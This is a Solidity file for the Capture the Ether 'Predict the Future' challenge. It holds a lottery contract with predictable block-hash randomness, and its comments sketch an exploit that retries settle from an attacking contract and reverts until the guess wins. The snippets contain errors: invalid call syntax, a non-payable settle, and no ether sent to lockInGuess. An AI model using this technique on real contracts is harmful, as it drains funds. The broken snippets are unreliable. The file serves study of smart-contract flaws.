pragma solidity ^0.4.21;


// @note - https://capturetheether.com/challenges/lotteries/predict-the-future/
// @note - This time, you have to lock in your guess before the random number is generated. 
//         To give you a sporting chance, there are only ten possible answers.
//         Note that it is indeed possible to solve this challenge without losing any ether.

// @note - Solution:
//       - Create a smart contract and call this function to guess randomly: guess 0
// ```
// function lockInGuess() external {
//     predictTheFutureChallenge.lockInGuess(0);
// }
// ```
//       - Spam trySettle function with 1 ETH, until answer == guess
//       - The 1 ETH will not be consumed, as trySettle will revert if isComplete returns false
// ```
// function trySettle() external payable {
//     predictTheFutureChallenge.settle{msg.value}();
//     require(predictTheFutureChallenge.isComplete(), "Didn't guess correct number.");
// }
// ```
contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}